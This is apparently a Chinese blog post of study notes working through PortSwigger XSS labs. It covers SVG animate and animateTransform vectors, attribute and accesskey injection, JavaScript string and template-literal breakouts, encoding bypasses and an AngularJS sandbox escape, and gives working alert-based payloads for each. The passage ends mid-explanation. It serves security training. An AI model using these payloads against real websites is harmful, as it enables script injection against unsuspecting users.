<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315114141709.png" alt="image-20230315114141709"></p>
<p><code>animate</code>元素</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315120917882.png" alt="image-20230315120917882"></p>
<p>学习一下利用的原理：<a target="_blank" rel="noopener" href="https://portswigger.net/research/svg-animate-xss-vector">https://portswigger.net/research/svg-animate-xss-vector</a></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315121127403.png" alt="image-20230315121127403"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315120831088.png" alt="image-20230315120831088"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    //url编码一下</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;animate+attributeName%3dhref+values%3djavascript%3aalert(1)+/&gt;&lt;text+x%3d20+y%3d20&gt;Click+me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理应该就是利用动画（将动画停滞在某一帧） 然后点击动画xss</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315121959776.png" alt="image-20230315121959776"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315122149302.png" alt="image-20230315122149302"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230315122235647.png" alt="image-20230315122235647"></p>
<h4 id="LAB-Reflected-XSS-with-some-SVG-markup-allowed"><a href="#LAB-Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="LAB: Reflected XSS with some SVG markup allowed"></a>LAB: Reflected XSS with some SVG markup allowed</h4><p>和之前一题一样fuzz得到未过滤的标签以及事件</p>
<p>可用标签三个</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230511230554929.png" alt="image-20230511230554929"></p>
<p>可用事件一个</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230511230352610.png" alt="image-20230511230352610"></p>
<p>这里说一下为什么要用animateTransform标签</p>
<p>上面可以看到可以用的事件只有onbegin,而svg标签是没有这个事件的</p>
<p>animateTransform是有onbegin事件的</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230511230614229.png" alt="image-20230511230614229"></p>
<p>svg和animateTransform的关系</p>
<p>可以把svg当成一个图,animateTransform就可以让图旋转</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230511230632091.png" alt="image-20230511230632091"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=&quot;&gt;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230511230736454.png" alt="image-20230511230736454"></p>
<h2 id="HTML-标签属性中的-XSS"><a href="#HTML-标签属性中的-XSS" class="headerlink" title="HTML 标签属性中的 XSS"></a>HTML 标签属性中的 XSS</h2><p>当XSS上下文进入HTML标记属性值时，您有时可以终止属性值、关闭标记并引入新标记。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure>

<p>但是常见的网页会将尖括号阻塞或编码，因此带有它的标签都会失效。如果可以终止属性值，那么另一种方法时引入一个新的属性来创建可编写脚本的上下文，例如：事件处理程序</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; autofocus on focus=alert(document.domain) x=&quot;</span></span><br></pre></td></tr></table></figure>

<p>上述payload创建了一个<code>onfocus</code>事件，该事件将在元素获得焦点时执行JavaScript，并且添加了属性<code>autofocus</code>以尝试<code>onfocus</code>即使没有任何用户交互的情况下自动触发该事件。并且在末尾添加<code>x=</code>来补全代码，巧妙结束语句</p>
<h3 id="LAB：将-XSS-反射到带有尖括号的-HTML-编码的属性中"><a href="#LAB：将-XSS-反射到带有尖括号的-HTML-编码的属性中" class="headerlink" title="LAB：将 XSS 反射到带有尖括号的 HTML 编码的属性中"></a>LAB：将 XSS 反射到带有尖括号的 HTML 编码的属性中</h3><p>test测试一下，发现嵌到了value里，尝试拼接</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512110405902.png" alt="image-20230512110405902"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512110559803.png" alt="image-20230512110559803"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>发现采用了实体编码  利用之前说的方法 onfocus事件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;autofocus onfocus=alert(1) x=&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512110930552.png" alt="image-20230512110930552"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512111057408.png" alt="image-20230512111057408"></p>
<p>有时xss上下文是一种HTML标记属性，它本身可以创建一个可编写脚本的上下文。因此，我们可以直接执行JavaScript而无需终止属性值。例如，如果XSS上下文进入<code>href</code>锚标记<strong>（用于链接到另一个页面）</strong>的属性，则可以使用javascript伪协议执行脚本。</p>
<p>先看正常用法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;javascript:location.reload()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;javascript:location.replace(location.href)&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们进行恶意利用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(document.domain)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="LAB-将xss存储到带有双引号HTML编码的锚点属性中"><a href="#LAB-将xss存储到带有双引号HTML编码的锚点属性中" class="headerlink" title="LAB:将xss存储到带有双引号HTML编码的锚点属性中"></a>LAB:将xss存储到带有双引号HTML编码的锚点属性中</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512123744079.png" alt="image-20230512123744079"></p>
<p>拼接尝试，失败了  事实证明 p 标签内无法进行xss html嵌入</p>
<p>burpsuite抓包，发现网址中有a标签 并利用href属性</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512125038629.png" alt="image-20230512125038629"></p>
<p>再次尝试</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512125104632.png" alt="image-20230512125104632"></p>
<p>ok 成功了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512125137303.png" alt="image-20230512125137303"></p>
<p>寻思怎么没弹呢，回过头梳理一下 他在评论作者名上采用了锚点  点击即可</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512125416357.png" alt="image-20230512125416357"></p>
<p>有一种情况是网站对尖括号进行编码但仍允许您注入属性。即使在通常不会自动触发事件的标签（例如规范标签）中，这些注入也是可能的。</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230512152220252.png" alt="image-20230512152220252"></p>
<p>您可以在 Chrome 上使用访问密钥和用户交互来利用此行为。访问键允许您提供引用特定元素的键盘快捷键。该<code>accesskey</code>属性允许您定义一个字母，当与其他键（这些键因平台而异）一起按下时，将触发事件。在下一个实验中，您可以试验访问密钥并利用规范标签。</p>
<h3 id="LAB-规范链接标签中的反射型XSS"><a href="#LAB-规范链接标签中的反射型XSS" class="headerlink" title="LAB:规范链接标签中的反射型XSS"></a>LAB:规范链接标签中的反射型XSS</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513112628586.png" alt="image-20230513112628586"></p>
<p>可以看到采用了规范标签  规范标签存在属性accesskey，可以利用该属性进行反射型xss 的利用</p>
<p>闭合单引号增加link的属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#x27;accesskey=&#x27;x</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513113041122.png" alt="image-20230513113041122"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513113625556.png" alt="image-20230513113625556"></p>
<h2 id="在JavaScript利用XSS"><a href="#在JavaScript利用XSS" class="headerlink" title="在JavaScript利用XSS"></a>在JavaScript利用XSS</h2><p>当XSS上下文是响应中的一些现有JavaScript时，可以进行利用，主要有以下几种方法：</p>
<ul>
<li>终止现存的脚本</li>
<li>逃逸出JS字符串</li>
<li>利用HTML编码</li>
<li>JS模板文字中的XSS</li>
</ul>
<h3 id="终止现有脚本"><a href="#终止现有脚本" class="headerlink" title="终止现有脚本"></a>终止现有脚本</h3><p>在最简单的情况下，可以简单地关闭包含现有 JavaScript 的脚本标签，并引入一些将触发 JavaScript 执行的新 HTML 标签。例如，如果 XSS 上下文如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> ... <span class="keyword">var</span> input = <span class="string">&#x27;controllable data here&#x27;</span>; ... </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么您可以使用以下有效负载来突破现有的 JavaScript 并执行您自己的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的原理是浏览器首先执行HTML解析以识别包括脚本块在内的页面元素，然后才执行JavaScript解析以理解和执行嵌入式脚本。上面的有效载荷使原始脚本失效，带有未终止的字符串文字。但这并不妨碍后续脚本以正常方式被解析和执行。</p>
<h3 id="LAB-Reflected-XSS-into-a-JavaScript-string单引号和反斜杠被转义"><a href="#LAB-Reflected-XSS-into-a-JavaScript-string单引号和反斜杠被转义" class="headerlink" title="LAB:Reflected XSS into a JavaScript string单引号和反斜杠被转义"></a>LAB:Reflected XSS into a JavaScript string单引号和反斜杠被转义</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513141926962.png" alt="image-20230513141926962"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513142209928.png" alt="image-20230513142209928"></p>
<h3 id="JS字符串逃逸"><a href="#JS字符串逃逸" class="headerlink" title="JS字符串逃逸"></a>JS字符串逃逸</h3><p>如果上下文是单引号的情况下，可以利用一些方法逃逸出来直接执行JS，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(document.domain)-&#x27;</span><br><span class="line">&#x27;;alert(document.domain)//</span><br></pre></td></tr></table></figure>

<p>-alert(1)/“ 中的减号的意思：让 js 语句不发生错误 </p>
<p>(   ‘+’: 在 url 的 uqery 中是空格的编码，而 % 号是表示url编码的标识符，/号在url中是表示一个path，所以用减号最合适。)</p>
<h3 id="LAB-单引号被html编码情况下的JS中xss利用"><a href="#LAB-单引号被html编码情况下的JS中xss利用" class="headerlink" title="LAB:单引号被html编码情况下的JS中xss利用"></a>LAB:单引号被html编码情况下的JS中xss利用</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513150753085.png" alt="image-20230513150753085"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513160012801.png" alt="image-20230513160012801"></p>
<p>有的网站通过使用反斜杠转义单引号字符来防止输入终端JS字符串。但我们仍可以利用以下payload进行绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设输入：</span><br><span class="line">	&#x27;;alert(document.domain)//</span><br><span class="line">转换为：</span><br><span class="line">	\&#x27;;alert(document.domain)//</span><br><span class="line">绕过payload:</span><br><span class="line">	\&#x27;;alert(document.domain)//</span><br></pre></td></tr></table></figure>

<p>我们这里利用反斜杠将web应用用来转义的反斜杠转义为普通字符，因此我们仍可利用进行xss攻击</p>
<h3 id="LAB-利用反斜杠转义单引号"><a href="#LAB-利用反斜杠转义单引号" class="headerlink" title="LAB: 利用反斜杠转义单引号"></a>LAB: 利用反斜杠转义单引号</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513161606977.png" alt="image-20230513161606977"></p>
<p>很容易发现 采用了反斜杠转义字符</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513161921427.png" alt="image-20230513161921427"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&#x27;-alert(1)//</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230513161955189.png" alt="image-20230513161955189"></p>
<p>另一种对XSS利用的限制就是禁止括号的使用。这种限制我们也是可以利用方法进行绕过的，比如以下payload便不使用括号进行执行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如若分号也限制，那可以采取以下方法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//采用语句块进行绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>throw 可以创建一个JS异常并且接收一条JS表达式<br>onerror 可以部署一个用来对JS代码进行错误处理的方法</p>
<h3 id="LAB-在-JavaScript-URL-中反映了-XSS，并阻止了一些字符"><a href="#LAB-在-JavaScript-URL-中反映了-XSS，并阻止了一些字符" class="headerlink" title="LAB:在 JavaScript URL 中反映了 XSS，并阻止了一些字符"></a>LAB:在 JavaScript URL 中反映了 XSS，并阻止了一些字符</h3><p>可以在返回博客主页的代码中发现以下代码段</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514154009808.png" alt="image-20230514154009808"></p>
<p>这段代码是一个HTML链接，其中包含JavaScript代码，当用户单击链接时，它会执行JavaScript代码。让我们逐步解释代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1&#x27;&#125;).finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;</span>&gt;</span>Back to Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>&lt;a&gt;</code> 标签：这是一个HTML锚标签，它定义了一个超链接。</p>
</li>
<li><p><code>href</code> 属性：指定链接的目标URL，但在这种情况下，它是一个JavaScript代码片段，而不是一个URL。这意味着单击链接时，JavaScript代码将在当前页面中执行，而不是导航到新页面。</p>
</li>
<li><p><code>javascript:fetch(&#39;/analytics&#39;, &#123;method:&#39;post&#39;,body:&#39;/post%3fpostId%3d1&#39;&#125;).finally(_ =&gt; window.location = &#39;/&#39;)</code>：这是 JavaScript 代码片段，它使用 <code>fetch()</code> 函数来发送一个 POST 请求到 <code>/analytics</code> URL，请求的主体是 <code>/post?postId=1</code>。请求完成后，<code>finally</code> 代码块将执行，将窗口位置设置为当前页面的根路径，即回到主页。</p>
</li>
</ul>
<p>因此，当用户单击此链接时，它将向服务器发送一个 POST 请求，然后在返回主页时刷新页面。但是，如果你没有实现这个 <code>/analytics</code> URL，这段代码就不会有效果。</p>
<p>官方提供了以下payload进行恶意利用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;&#x27;&#125;).finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;</span>&gt;</span></span><br><span class="line">    Back to Blog</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码主要是定义了一个函数 x，然后将该函数的 toString 方法赋值给变量 toString。最后，将 window 对象转化为字符串，将一个空对象作为键名添加到这个字符串中。</p>
<p>下面我们来详细解释一下这个函数的定义部分：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="comment">/**/</span> onerror=alert, <span class="number">1337</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里定义了一个名为 x 的函数，它接受一个参数 x，然后使用 throw 语句抛出了一个异常。在这个 throw 语句中，使用了注释的方式来将 onerror 属性设置为 alert 函数，同时将异常代码设置为 1337。</p>
<p>这个函数看起来非常奇怪，其实是通过注入 onerror 事件的方式来实现恶意攻击。当异常抛出时，onerror 事件会被触发，如果 onerror 属性被设置为一个函数，这个函数就会被调用。在这个函数中，alert 函数被执行，弹出一个警告框。同时，异常代码设置为 1337，可能会被攻击者用于其他目的。</p>
<p>接下来是这个函数的 toString 方法，它被赋值给了变量 toString。在 JavaScript 中，toString 方法会被自动调用，用于将对象转换为字符串。在这里，我们将这个函数转换为字符串，然后将结果作为 window 对象的属性进行加法运算。这个操作可以将字符串与 window 对象连接起来，使得该函数的闭包中添加了一个空对象 <code>&#123; x: &#39;&#39; &#125;</code>。</p>
<p>最后，使用 finally 语句在请求完成之后，跳转到页面的根路径 <code>/</code>。</p>
</blockquote>
<h3 id="使用HTML编码"><a href="#使用HTML编码" class="headerlink" title="使用HTML编码"></a>使用HTML编码</h3><p>当浏览器解析出响应中的HTML标记和属性时，它将在标记属性值被进一步处理之前执行HTML解码。因此，如果服务器端应用程序阻止或成功清理XSS标记所需的某些字符，我们可以通过HTML编码来绕过输入验证。</p>
<p>例如，如果 XSS 上下文如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;... var input=&#x27;controllable data here&#x27;; ...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且应用程序阻止或转义单引号字符，您可以使用以下有效负载来中断 JavaScript 字符串并执行您自己的脚本：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(document.domain)-&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="LAB-使用尖括号和双引号将-XSS-存储到事件中-HTML-编码和单引号和反斜杠转义"><a href="#LAB-使用尖括号和双引号将-XSS-存储到事件中-HTML-编码和单引号和反斜杠转义" class="headerlink" title="LAB:使用尖括号和双引号将 XSS 存储到事件中 HTML 编码和单引号和反斜杠转义"></a>LAB:使用尖括号和双引号将 XSS 存储到事件中 HTML 编码和单引号和反斜杠转义</h3><p>首先解决的应该是这个格式问题</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514172150402.png" alt="image-20230514172150402"></p>
<p>很简单 以<code>http://</code>开头<br>传上去发现 反斜杠转义了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514171956914.png" alt="image-20230514171956914"></p>
<p>尝试用反斜杠转义反斜杠 发现反斜杠也被转义了 g</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514172949999.png" alt="image-20230514172949999"></p>
<p>这里直接用HTML实体编码进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&amp;apos;-alert(1)-&amp;apos;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514173418518.png" alt="image-20230514173418518"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514173227413.png" alt="image-20230514173227413"></p>
<h3 id="JavaScript模板文字中的XSS"><a href="#JavaScript模板文字中的XSS" class="headerlink" title="JavaScript模板文字中的XSS"></a>JavaScript模板文字中的XSS</h3><p><strong>JavaScript模板文字</strong>是<strong>允许嵌入JavaScript表达式</strong>的字符串文字。嵌入的表达式被评估并通常连接到周围的文本中。<strong>模板文字被封装在反引号中</strong>而不是普通的引号中，嵌入的表达式使用**<code>$&#123;...&#125;</code>**语法来识别。</p>
<p>例如，以下代码将打印包含用户显示名称的欢迎消息：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;message&#x27;</span>).innerText = <span class="string">`Welcome,<span class="subst">$&#123;user.displayName&#125;</span>.`</span>;</span><br></pre></td></tr></table></figure>

<p>当 XSS 上下文进入 JavaScript 模板文字时，无需终止文字。相反，您只需要使用<code>$&#123;...&#125;</code>语法来嵌入将在处理文字时执行的 JavaScript 表达式。例如，如果 XSS 上下文如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> ... <span class="keyword">var</span> input = <span class="string">`controllable data here`</span>; ... </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么您可以使用以下有效负载来执行 JavaScript 而无需终止模板文字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(document.domain)&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LAB-JavaScript模板的xss注入"><a href="#LAB-JavaScript模板的xss注入" class="headerlink" title="LAB:JavaScript模板的xss注入"></a>LAB:JavaScript模板的xss注入</h3><p>测试发现单引号被unicode编码了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514191645545.png" alt="image-20230514191645545"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(document.domain)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230514192211115.png" alt="image-20230514192211115"></p>
<h3 id="LAB-AngularJS沙盒逃逸中过滤了字符串的反射型xss"><a href="#LAB-AngularJS沙盒逃逸中过滤了字符串的反射型xss" class="headerlink" title="LAB:AngularJS沙盒逃逸中过滤了字符串的反射型xss"></a>LAB:AngularJS沙盒逃逸中过滤了字符串的反射型xss</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?search=<span class="number">1</span>&amp;toString().constructor.prototype.charAt=[].join;[<span class="number">1</span>]|orderBy:toString().constructor.fromCharCode(<span class="number">120</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>)=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//url编码</span></span><br><span class="line">?search=<span class="number">1</span>&amp;toString().constructor.prototype.charAt%3d[].join;[<span class="number">1</span>]|orderBy:toString().constructor.fromCharCode(<span class="number">120</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>)=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>代码解释</p>
<blockquote>
<p>这段代码是一个类似于 JavaScript 的语法，并使用 AngularJS 中的一个特殊功能来注入并执行恶意 JavaScript 代码。让我们来分解它：</p>
<ul>
<li><p><code>toString()</code>：这个函数返回一个对象的字符串表示形式。在这种情况下，它返回一个字符串 “function () { [native code] }”，表示构造函数的实现。</p>
</li>
<li><p><code>constructor</code>：这是一个指向对象的构造函数的引用。在这种情况下，它是 <code>toString()</code> 函数的构造函数，即 <code>Function()</code> 构造函数。</p>
</li>
<li><p><code>prototype</code>：这是一个对象的原型，包含对象的属性和方法。在这种情况下，它是 <code>Function()</code> 构造函数的原型。</p>
</li>
<li><p><code>charAt=[].join</code>：这是将 <code>charAt</code> 函数的实现覆盖为 <code>join</code> 函数的语法。<code>[].join</code> 是一个空数组的 <code>join()</code> 方法，它将所有数组元素转换为字符串并将它们连接在一起。</p>
</li>
<li><p><code>[1]</code>：这是一个数组字面量，其中包含一个单独的数字 1。</p>
</li>
<li><p><code>|</code>：这是一个 AngularJS 中的管道符号，用于将一个表达式的结果传递给另一个表达式。</p>
</li>
<li><p><code>orderBy</code>：这是 AngularJS 中的一个过滤器，用于对集合进行排序。</p>
